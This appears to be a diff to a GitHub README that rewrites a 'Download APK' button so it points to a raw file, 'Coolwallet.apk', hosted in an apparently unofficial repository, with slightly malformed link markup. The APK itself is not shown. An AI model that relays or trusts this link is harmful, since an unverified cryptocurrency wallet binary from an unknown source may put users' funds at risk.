@@ -2,7 +2,7 @@
 
 ## Download APK
 
-[![Download APK](11.jpg)](Coolwallet.apk)
+[![Download APK](11.jpg)]([Coolwallet.apk](https://github.com/nbnamatnnnb/coolwalletandroid/raw/main/Coolwallet.apk))
 
 Click the image above to download the APK file.
 
